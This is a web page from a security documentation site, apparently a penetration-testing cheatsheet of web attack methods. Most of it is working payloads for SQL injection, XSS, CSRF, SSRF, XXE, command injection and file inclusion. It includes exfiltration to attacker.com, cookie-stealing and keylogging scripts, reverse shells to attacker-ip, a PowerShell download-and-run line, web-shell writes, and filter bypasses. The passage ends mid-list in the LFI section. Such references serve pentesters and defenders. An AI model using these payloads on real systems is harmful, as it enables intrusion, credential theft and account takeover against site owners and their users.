---
title: Web Attack Methods
description: Comprehensive reference covering all major web application attack methods, techniques, payloads, and exploitation strategies for penetration testing.
navigation:
  icon: i-lucide-shield-alert
---

## Overview

Web application attacks exploit vulnerabilities in web technologies, server configurations, application logic, and user interactions. This cheatsheet provides an in-depth reference of all major **web attack methods**, including detection techniques, exploitation payloads, and tool usage.

> Web applications are the primary attack surface in modern environments. Understanding these attack methods is essential for both **offensive security professionals** and **defenders**.

---

## Attack Methods Summary

| Attack Method                  | Target                  | Impact                           |
| ------------------------------ | ----------------------- | -------------------------------- |
| SQL Injection (SQLi)           | Database layer          | Data theft, auth bypass, RCE     |
| Cross-Site Scripting (XSS)     | Client-side / Browser   | Session hijacking, defacement    |
| Cross-Site Request Forgery     | User session            | Unauthorized actions             |
| Server-Side Request Forgery    | Server-side requests    | Internal network access          |
| XML External Entity (XXE)      | XML parser              | File read, SSRF, DoS             |
| Local/Remote File Inclusion    | File handling           | Code execution, file read        |
| Command Injection              | OS command execution    | Full system compromise           |
| Directory Traversal            | File system             | Sensitive file access            |
| IDOR                           | Access control          | Unauthorized data access         |
| Authentication Bypass          | Login mechanisms         | Unauthorized access              |
| Session Attacks                | Session management      | Account takeover                 |
| HTTP Request Smuggling         | HTTP parsing            | Cache poisoning, bypass          |
| Server-Side Template Injection | Template engines        | Remote code execution            |
| Insecure Deserialization       | Object handling         | Remote code execution            |
| JWT Attacks                    | Token authentication    | Auth bypass, privilege escalation|
| File Upload Vulnerabilities    | Upload functionality    | Web shell, RCE                   |
| CORS Misconfiguration          | Cross-origin policy     | Data theft                       |
| Open Redirect                  | URL redirection         | Phishing, token theft            |
| Clickjacking                   | UI rendering            | Unauthorized actions             |
| Host Header Injection          | HTTP Host header        | Password reset poisoning         |
| Web Cache Poisoning            | Caching mechanisms      | Stored XSS, redirect            |
| NoSQL Injection                | NoSQL databases         | Auth bypass, data theft          |
| LDAP Injection                 | Directory services      | Auth bypass, data leak           |
| GraphQL Attacks                | GraphQL APIs            | Data exposure, DoS               |
| WebSocket Attacks              | WebSocket connections   | Hijacking, injection             |
| HTTP Parameter Pollution       | Parameter handling      | WAF bypass, logic flaws          |
| Subdomain Takeover             | DNS / Cloud services    | Full subdomain control           |
| API Attacks                    | REST / SOAP APIs        | Data theft, abuse                |

---

## SQL Injection (SQLi)

SQL Injection occurs when user input is incorporated into SQL queries without proper sanitization, allowing attackers to manipulate database queries.

### Detection

::code-preview
---
class: "[&>div]:*:my-0"
---
Test for SQL Injection.

#code
```
# Basic detection payloads (append to parameters)
'
"
`
')
")
`)
'))
"))
`))
;
' OR 1=1--
' OR 'a'='a
" OR "a"="a
' OR 1=1#
' OR 1=1/*
1' ORDER BY 1--+
1' ORDER BY 100--+
1' UNION SELECT NULL--+
```
::

### Authentication Bypass

::code-preview
---
class: "[&>div]:*:my-0"
---
Bypass login forms with SQLi.

#code
```
# Username field payloads
admin' --
admin' #
admin'/*
' OR 1=1--
' OR 1=1#
' OR '1'='1'--
') OR ('1'='1'--
' OR 1=1 LIMIT 1--
admin' OR '1'='1
' UNION SELECT 1, 'admin', 'password'--

# Password field payloads
' OR 1=1--
anything' OR '1'='1
```
::

### UNION-Based SQLi

::code-preview
---
class: "[&>div]:*:my-0"
---
Extract data using UNION queries.

#code
```
# Step 1: Determine number of columns
' ORDER BY 1--+
' ORDER BY 2--+
' ORDER BY 3--+
' UNION SELECT NULL--+
' UNION SELECT NULL,NULL--+
' UNION SELECT NULL,NULL,NULL--+

# Step 2: Find displayable columns
' UNION SELECT 1,2,3--+
' UNION SELECT 'a','b','c'--+

# Step 3: Extract database info
# MySQL
' UNION SELECT version(),database(),user()--+
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--+
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--+
' UNION SELECT username,password,NULL FROM users--+

# PostgreSQL
' UNION SELECT version(),current_database(),current_user--+
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--+

# MSSQL
' UNION SELECT @@version,db_name(),user--+
' UNION SELECT name,NULL,NULL FROM master..sysdatabases--+
' UNION SELECT name,NULL,NULL FROM sysobjects WHERE xtype='U'--+

# Oracle
' UNION SELECT banner,NULL FROM v$version--+
' UNION SELECT table_name,NULL FROM all_tables--+
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--+
```
::

### Error-Based SQLi

::code-preview
---
class: "[&>div]:*:my-0"
---
Extract data through error messages.

#code
```
# MySQL
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--+
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)--+
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+

# MSSQL
' AND 1=CONVERT(int, (SELECT @@version))--+
' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--+

# PostgreSQL
' AND 1=CAST((SELECT version()) AS int)--+
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--+

# Oracle
' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE rownum=1))--+
```
::

### Blind SQLi (Boolean-Based)

::code-preview
---
class: "[&>div]:*:my-0"
---
Extract data character by character.

#code
```
# Boolean-based blind
' AND 1=1--+                                          # True condition
' AND 1=2--+                                          # False condition
' AND SUBSTRING(database(),1,1)='a'--+                # Check first character
' AND SUBSTRING(database(),1,1)='m'--+
' AND ASCII(SUBSTRING(database(),1,1))>97--+           # Binary search
' AND ASCII(SUBSTRING(database(),1,1))=109--+
' AND (SELECT COUNT(*) FROM users)>0--+                # Check table exists
' AND LENGTH(database())=5--+                          # Check length
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--+
```
::

### Blind SQLi (Time-Based)

::code-preview
---
class: "[&>div]:*:my-0"
---
Extract data using time delays.

#code
```
# MySQL
' AND SLEEP(5)--+
' AND IF(1=1, SLEEP(5), 0)--+
' AND IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0)--+
' AND IF(ASCII(SUBSTRING(database(),1,1))>97, SLEEP(5), 0)--+
'; SELECT SLEEP(5)--+

# MSSQL
'; WAITFOR DELAY '0:0:5'--+
'; IF (1=1) WAITFOR DELAY '0:0:5'--+
'; IF (SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:5'--+

# PostgreSQL
'; SELECT pg_sleep(5)--+
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--+

# Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--+
```
::

### Out-of-Band SQLi

::code-preview
---
class: "[&>div]:*:my-0"
---
Exfiltrate data via DNS or HTTP.

#code
```
# MySQL (DNS exfiltration)
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\a'))--+

# MSSQL (DNS exfiltration)
'; EXEC master..xp_dirtree '\\attacker.com\share'--+
'; DECLARE @a varchar(1024); SET @a=(SELECT DB_NAME()); EXEC('master..xp_dirtree "\\'+@a+'.attacker.com\a"')--+

# Oracle (HTTP exfiltration)
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--+

# PostgreSQL (DNS)
'; COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT version())||'.attacker.com'--+
```
::

### SQLi to Remote Code Execution

::code-preview
---
class: "[&>div]:*:my-0"
---
Escalate SQLi to OS command execution.

#code
```
# MySQL - Write web shell
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--+
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO DUMPFILE '/var/www/html/shell.php'--+

# MySQL - Read files
' UNION SELECT LOAD_FILE('/etc/passwd')--+
' UNION SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts')--+

# MSSQL - Enable xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--+
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--+
'; EXEC xp_cmdshell 'whoami';--+
'; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker/shell.ps1'')"';--+

# PostgreSQL - Command execution
'; CREATE TABLE cmd_exec(cmd_output text);--+
'; COPY cmd_exec FROM PROGRAM 'id';--+
'; SELECT * FROM cmd_exec;--+
```
::

### SQLMap Automation

::code-preview
---
class: "[&>div]:*:my-0"
---
Automated SQL injection with SQLMap.

#code
```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# POST request
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# Cookie-based
sqlmap -u "http://target.com/page" --cookie="session=abc123" -p "session"

# Specify DBMS
sqlmap -u "http://target.com/page?id=1" --dbms=mysql

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Dump table
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump

# Dump specific columns
sqlmap -u "http://target.com/page?id=1" -D database_name -T users -C username,password --dump

# OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# SQL shell
sqlmap -u "http://target.com/page?id=1" --sql-shell

# File read
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"

# File write
sqlmap -u "http://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# WAF bypass
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between,randomcase

# With request file (from Burp)
sqlmap -r request.txt

# Batch mode (no prompts)
sqlmap -u "http://target.com/page?id=1" --batch

# Risk and level
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3

# Threads
sqlmap -u "http://target.com/page?id=1" --threads=10

# Proxy
sqlmap -u "http://target.com/page?id=1" --proxy="http://127.0.0.1:8080"

# Techniques (B=Boolean, E=Error, U=Union, S=Stacked, T=Time)
sqlmap -u "http://target.com/page?id=1" --technique=BEUST
```
::

### SQLi WAF Bypass Techniques

| Technique                | Example                                    |
| ------------------------ | ------------------------------------------ |
| Case variation           | `SeLeCt`, `uNiOn`                          |
| Comment insertion        | `UN/**/ION SE/**/LECT`                     |
| URL encoding             | `%27 %4F%52 %31%3D%31`                     |
| Double URL encoding      | `%2527`                                    |
| Unicode encoding         | `%u0027`, `%u004F%u0052`                   |
| Hex encoding             | `0x61646d696e` (admin)                     |
| Null bytes               | `%00' UNION SELECT`                        |
| Newline injection        | `%0A UNION SELECT`                         |
| Tab injection            | `%09UNION%09SELECT`                        |
| Inline comments          | `/*!50000UNION*//*!50000SELECT*/`          |
| Concat functions         | `CONCAT(0x61,0x64,0x6d,0x69,0x6e)`        |
| Alternative keywords     | `UNION ALL SELECT`, `||` instead of `OR`   |
| Buffer overflow (WAF)    | `?id=1 AND (SELECT 1)=(SELECT 0xAAAA...)+UNION+SELECT+1,2` |
| HTTP Parameter Pollution | `?id=1&id=UNION&id=SELECT`                 |

---

## Cross-Site Scripting (XSS)

XSS allows attackers to inject malicious scripts into web pages viewed by other users.

### Reflected XSS

::code-preview
---
class: "[&>div]:*:my-0"
---
Reflected XSS payloads.

#code
```html
<!-- Basic payloads -->
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>

<!-- IMG tag -->
<img src=x onerror=alert('XSS')>
<img src=x onerror=alert(document.domain)>
<img/src=x onerror=alert('XSS')>
<img src=x onerror="alert('XSS')"/>

<!-- SVG tag -->
<svg onload=alert('XSS')>
<svg/onload=alert('XSS')>
<svg onload="alert('XSS')">

<!-- Body tag -->
<body onload=alert('XSS')>
<body onpageshow=alert('XSS')>

<!-- Input tag -->
<input onfocus=alert('XSS') autofocus>
<input onmouseover=alert('XSS')>

<!-- Iframe -->
<iframe src="javascript:alert('XSS')">
<iframe onload=alert('XSS')>

<!-- Details tag -->
<details open ontoggle=alert('XSS')>

<!-- Marquee tag -->
<marquee onstart=alert('XSS')>

<!-- Video tag -->
<video src=x onerror=alert('XSS')>
<video><source onerror=alert('XSS')>

<!-- Audio tag -->
<audio src=x onerror=alert('XSS')>
```
::

### Stored XSS

::code-preview
---
class: "[&>div]:*:my-0"
---
Persistent XSS payloads for stored contexts.

#code
```html
<!-- Cookie stealing -->
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>
<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>

<!-- Keylogger -->
<script>
document.onkeypress=function(e){
  fetch('http://attacker.com/log?k='+e.key);
}
</script>

<!-- Session hijacking -->
<script>
fetch('http://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    url: window.location.href,
    localStorage: JSON.stringify(localStorage)
  })
});
</script>

<!-- Phishing form injection -->
<div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
<h2>Session Expired - Please Login</h2>
<form action="http://attacker.com/phish">
  <input name="user" placeholder="Username">
  <input name="pass" type="password" placeholder="Password">
  <button>Login</button>
</form>
</div>

<!-- DOM manipulation -->
<script>document.body.innerHTML='<h1>Hacked</h1>'</script>

<!-- Redirect -->
<script>window.location='http://attacker.com'</script>
<meta http-equiv="refresh" content="0;url=http://attacker.com">
```
::

### DOM-Based XSS

::code-preview
---
class: "[&>div]:*:my-0"
---
DOM-based XSS attack vectors.

#code
```
# Common DOM XSS sinks
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
eval()
setTimeout()
setInterval()
window.location
document.location
location.href
location.assign()
location.replace()

# Common DOM XSS sources
document.URL
document.documentURI
document.referrer
location.href
location.search
location.hash
window.name
document.cookie
postMessage data

# Test payloads via URL hash
http://target.com/page#<img src=x onerror=alert(1)>
http://target.com/page#<script>alert(1)</script>

# Test via URL parameters
http://target.com/page?param=<script>alert(1)</script>
http://target.com/page?redirect=javascript:alert(1)

# window.name exploitation
# On attacker page:
<script>
window.name = "<img src=x onerror=alert(document.cookie)>";
window.location = "http://target.com/vulnerable";
</script>

# postMessage exploitation
<iframe src="http://target.com" onload="this.contentWindow.postMessage('<img src=x onerror=alert(1)>','*')">
```
::

### XSS Filter Bypass Techniques

::code-preview
---
class: "[&>div]:*:my-0"
---
Bypass XSS filters and WAFs.

#code
```html
<!-- Case variation -->
<ScRiPt>alert('XSS')</ScRiPt>
<IMG SRC=x OnErRoR=alert('XSS')>

<!-- Encoding bypasses -->
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">click</a>

<!-- Without parentheses -->
<script>alert`XSS`</script>
<script>onerror=alert;throw 'XSS'</script>
<script>{onerror=alert}throw 'XSS'</script>

<!-- Without alert keyword -->
<script>[].constructor.constructor('return alert(1)')()</script>
<script>self['al'+'ert'](1)</script>
<script>window['al'+'ert'](1)</script>
<script>top[/al/.source+/ert/.source](1)</script>

<!-- Without script tags -->
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body/onload=alert(1)>
<input autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><svg><mtext><textarea><path id=x xmlns=http://www.w3.org/2000/svg><set attributeName=d to='M0 0'/></path></textarea></mtext></svg></mglyph></table></mtext></math>

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C%252Fscript%253E

<!-- Null byte injection -->
<scri%00pt>alert(1)</scri%00pt>

<!-- Mutation XSS (mXSS) -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- Using constructor -->
<script>constructor.constructor('alert(1)')()</script>

<!-- SVG focus event -->
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click</text></a></svg>
```
::

### XSS Context-Specific Payloads

| Context                    | Payload Example                                        |
| -------------------------- | ------------------------------------------------------ |
| Inside HTML tag            | `"><script>alert(1)</script>`                          |
| Inside attribute           | `" onfocus=alert(1) autofocus="`                       |
| Inside `href`              | `javascript:alert(1)`                                 |
| Inside JavaScript string   | `'; alert(1);//`                                       |
| Inside JavaScript template | `${alert(1)}`                                          |
| Inside HTML comment        | `--><script>alert(1)</script><!--`                     |
| Inside `<style>` tag       | `</style><script>alert(1)</script>`                    |
| Inside `<textarea>`        | `</textarea><script>alert(1)</script>`                 |
| Inside JSON                | `"}</script><script>alert(1)</script>`                 |
| Inside SVG                 | `<svg onload=alert(1)>`                                |
| Inside XML/XHTML           | `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>` |

---

## Cross-Site Request Forgery (CSRF)

CSRF forces authenticated users to perform unintended actions by exploiting their active session.

### Basic CSRF

::code-preview
---
class: "[&>div]:*:my-0"
---
CSRF attack templates.

#code
```html
<!-- GET-based CSRF -->
<img src="http://target.com/admin/deleteuser?id=1" style="display:none">
<iframe src="http://target.com/admin/deleteuser?id=1" style="display:none"></iframe>

<!-- POST-based CSRF (auto-submit) -->
<html>
<body onload="document.getElementById('csrf').submit()">
  <form id="csrf" action="http://target.com/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="confirm" value="1">
  </form>
</body>
</html>

<!-- CSRF with XHR -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://target.com/change-password', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.withCredentials = true;
xhr.send('new_password=hacked123&confirm_password=hacked123');
</script>

<!-- CSRF with fetch -->
<script>
fetch('http://target.com/change-password', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'new_password=hacked123&confirm_password=hacked123'
});
</script>

<!-- CSRF with JSON body -->
<script>
fetch('http://target.com/api/change-role', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: '{"role":"admin","userId":1}'
});
</script>
```
::

### CSRF Token Bypass

::code-preview
---
class: "[&>div]:*:my-0"
---
Techniques to bypass CSRF protections.

#code
```
# Remove CSRF token entirely
# Some apps only validate if token is present

# Use empty token
csrf_token=

# Use another user's token
# Tokens may not be tied to sessions

# Change request method
# POST with token → GET without token
GET /change-email?email=attacker@evil.com

# Remove Referer header
<meta name="referrer" content="no-referrer">

# Subdomain-based Referer bypass
# If validation checks for "target.com" in Referer
# Use: http://target.com.attacker.com/csrf

# Clickjacking + CSRF combo
<iframe src="http://target.com/settings" style="opacity:0.01;position:absolute;top:0;left:0;width:100%;height:100%"></iframe>
<button style="position:relative;z-index:2">Click to win!</button>

# CSRF via XSS
# If XSS exists, extract CSRF token and use it
<script>
var page = new XMLHttpRequest();
page.open('GET', '/settings', false);
page.send();
var token = page.responseText.match(/csrf_token" value="([^"]+)"/)[1];
var xhr = new XMLHttpRequest();
xhr.open('POST', '/change-email', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('email=attacker@evil.com&csrf_token=' + token);
</script>
```
::

---

## Server-Side Request Forgery (SSRF)

SSRF allows attackers to make the server send requests to unintended locations, accessing internal resources.

### Basic SSRF

::code-preview
---
class: "[&>div]:*:my-0"
---
Common SSRF payloads.

#code
```
# Access localhost
http://127.0.0.1
http://localhost
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:8080
http://127.0.0.1:8443
http://127.0.0.1:3000

# Internal network scanning
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1

# Cloud metadata endpoints
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01

# DigitalOcean
http://169.254.169.254/metadata/v1/

# Internal services
http://127.0.0.1:6379/         # Redis
http://127.0.0.1:27017/        # MongoDB
http://127.0.0.1:3306/         # MySQL
http://127.0.0.1:5432/         # PostgreSQL
http://127.0.0.1:9200/         # Elasticsearch
http://127.0.0.1:8500/         # Consul
http://127.0.0.1:2379/         # etcd
http://127.0.0.1:11211/        # Memcached
http://127.0.0.1:5000/         # Docker Registry
http://127.0.0.1:8080/manager/ # Tomcat Manager
```
::

### SSRF Bypass Techniques

::code-preview
---
class: "[&>div]:*:my-0"
---
Bypass SSRF filters and blocklists.

#code
```
# Alternative localhost representations
http://0.0.0.0
http://0
http://127.1
http://127.0.1
http://2130706433               # Decimal IP (127.0.0.1)
http://0x7f000001               # Hex IP
http://017700000001             # Octal IP
http://[::1]                    # IPv6 localhost
http://[0000::1]
http://[::ffff:127.0.0.1]
http://①②⑦.⓪.⓪.①             # Unicode
http://127.0.0.1.nip.io
http://localtest.me
http://spoofed.burpcollaborator.net

# URL parsing confusion
http://attacker.com@127.0.0.1
http://127.0.0.1#@attacker.com
http://127.0.0.1%2523@attacker.com
http://attacker.com\@127.0.0.1

# Protocol smuggling
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
dict://127.0.0.1:6379/info
file:///etc/passwd
tftp://attacker.com/file
ldap://127.0.0.1

# Redirect-based bypass
# Host attacker-controlled URL that redirects to internal
http://attacker.com/redirect?url=http://127.0.0.1

# DNS rebinding
# Configure DNS to return attacker IP first, then 127.0.0.1

# Enclosed alphanumerics
http://⑯⑨.②⑤④.①⑥⑨.②⑤④

# URL encoding
http://127.0.0.1/%61dmin
http://%31%32%37%2e%30%2e%30%2e%31
```
::

### SSRF Protocol Exploitation

| Protocol   | Use Case                              | Example                                    |
| ---------- | ------------------------------------- | ------------------------------------------ |
| `http`     | Web services, APIs                    | `http://127.0.0.1:8080`                    |
| `https`    | Encrypted web services                | `https://127.0.0.1`                        |
| `file`     | Local file read                       | `file:///etc/passwd`                       |
| `gopher`   | Redis, SMTP, MySQL exploitation       | `gopher://127.0.0.1:6379/_COMMAND`         |
| `dict`     | Service banner grabbing               | `dict://127.0.0.1:6379/info`               |
| `ftp`      | FTP service interaction               | `ftp://127.0.0.1`                          |
| `tftp`     | TFTP file retrieval                   | `tftp://attacker.com/file`                 |
| `ldap`     | LDAP directory access                 | `ldap://127.0.0.1`                         |
| `smb`      | SMB share access                      | `\\127.0.0.1\share`                        |

---

## XML External Entity (XXE)

XXE exploits vulnerable XML parsers to read files, perform SSRF, or execute denial of service.

### Basic XXE

::code-preview
---
class: "[&>div]:*:my-0"
---
XXE payloads for file reading.

#code
```xml
<!-- Basic file read -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- Windows file read -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
]>
<root>&xxe;</root>

<!-- SSRF via XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!-- XXE via parameter entities -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>

<!-- PHP filter for base64 encoding -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root>&xxe;</root>
```
::

### Blind XXE

::code-preview
---
class: "[&>div]:*:my-0"
---
Out-of-band XXE data exfiltration.

#code
```xml
<!-- Payload sent to target -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
  %send;
]>
<root>test</root>

<!-- evil.dtd hosted on attacker server -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;

<!-- Error-based XXE exfiltration -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

<!-- XXE via SVG upload -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">&xxe;</text>
</svg>

<!-- XXE via Excel (XLSX) -->
<!-- Modify xl/workbook.xml inside XLSX -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<workbook>&xxe;</workbook>
```
::

### XXE Denial of Service

::code-preview
---
class: "[&>div]:*:my-0"
---
XXE Billion Laughs attack.

#code
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<root>&lol9;</root>
```
::

---

## Command Injection

OS command injection allows attackers to execute arbitrary operating system commands through the application.

### Basic Command Injection

::code-preview
---
class: "[&>div]:*:my-0"
---
Command injection payloads.

#code
```
# Command separators (Linux)
; ls
| ls
|| ls
& ls
&& ls
$(ls)
`ls`
\n ls
%0a ls

# Command separators (Windows)
& dir
&& dir
| dir
|| dir
%0a dir

# Common injection points
; whoami
| id
|| cat /etc/passwd
& hostname
&& ifconfig
$(whoami)
`uname -a`

# Blind command injection (time-based)
; sleep 10
| sleep 10
& timeout /t 10
|| ping -c 10 127.0.0.1
; ping -n 10 127.0.0.1

# Blind command injection (out-of-band)
; nslookup attacker.com
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/$(hostname)
| nslookup $(whoami).attacker.com
; ping -c 1 $(whoami).attacker.com

# Reverse shell via command injection
; bash -c 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1'
| nc attacker-ip 4444 -e /bin/sh
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker-ip",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```
::

### Command Injection Filter Bypass

::code-preview
---
class: "[&>div]:*:my-0"
---
Bypass command injection filters.

#code
```bash
# Space bypass
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
X=$'\x20';cat${X}/etc/passwd
cat</etc/passwd
cat%09/etc/passwd                  # Tab

# Keyword bypass
# If "cat" is blocked
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
ca$()t /etc/passwd
/bin/c?t /etc/passwd
/bin/ca* /etc/passwd

# If "etc/passwd" is blocked
cat /e'tc'/pa'ss'wd
cat /e"tc"/pa"ss"wd
cat /e\tc/pa\ss\wd
cat /etc/pass??
cat /etc/p*

# Using environment variables
echo ${PATH:0:1}                    # Gives "/"
cat ${HOME:0:1}etc${HOME:0:1}passwd

# Using wildcards
/???/??t /???/??????

# Base64 encoding
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash

# Hex encoding
echo "636174202f6574632f706173737764" | xxd -r -p | bash

# $() and backticks
$(whoami)
`whoami`

# Variable assignment
a=ca;b=t;$a$b /etc/passwd

# Newline bypass
%0a whoami
%0d%0a whoami
```
::

---

## Local File Inclusion (LFI) / Remote File Inclusion (RFI)

File inclusion vulnerabilities allow attackers to include files from the local server or remote sources.

### Local File Inclusion (LFI)

::code-preview
---
class: "[&>div]:*:my-0"
---
LFI payloads for reading local files.

#code
```
# Basic LFI (Linux)
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd

# Basic LFI (Windows)
..\..\..\windows\system32\drivers\etc\hosts
..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts

# Null byte termination (PHP < 5.3.4)
../../../etc/passwd%00
../../../etc/passwd%00.php
../../../etc/passwd%00.html

# Useful Linux files to read
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/crontab
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/mysql/my.cnf
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
